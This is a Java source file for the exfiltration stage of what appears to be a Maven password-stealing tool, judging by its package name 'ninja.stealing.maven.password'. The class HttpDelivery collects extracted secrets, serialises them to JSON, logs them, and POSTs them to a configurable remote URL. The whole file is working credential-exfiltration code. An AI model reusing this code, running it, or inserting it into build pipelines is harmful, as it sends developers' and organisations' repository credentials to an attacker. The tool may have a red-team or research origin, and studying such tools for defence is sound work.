package ninja.stealing.maven.password.delivery;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import ninja.stealing.maven.password.Logger.Logger;
import ninja.stealing.maven.password.model.Extraction;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.List;

import static java.time.temporal.ChronoUnit.SECONDS;

public class HttpDelivery implements  Delivery{

    private Logger log;
    private String url;

    public HttpDelivery(Logger log, String url) {
        this.log = log;
        this.url = url;

    }

    @Override
    public void deliver(List<Extraction> extractions) {
        ObjectMapper mapper = new ObjectMapper();
        ObjectNode logNode = mapper.createObjectNode();
        log.info("Delivering extraction through HTTP post");
        for (Extraction extraction: extractions) {
            log.info("Extracting: " + extraction.getExtractorId());
            logNode.put(extraction.getExtractorId(),extraction.getContent());
        }
        String json = "";
        try {
            json = mapper.writerWithDefaultPrettyPrinter().writeValueAsString(logNode);
        } catch (JsonProcessingException e) {
            json = "Can't decode json";
        }
        log.info("  - Content: " + json);

        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(new URI(url))
                    .header("Content-Type", "application/json")
                    .timeout(Duration.of(60, SECONDS))
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();
            HttpResponse<String> response = HttpClient.newBuilder()
                    .build()
                    .send(request, HttpResponse.BodyHandlers.ofString());
        }catch (URISyntaxException | InterruptedException | IOException ex){
            log.warn("Ex during request");
        }
    }
}
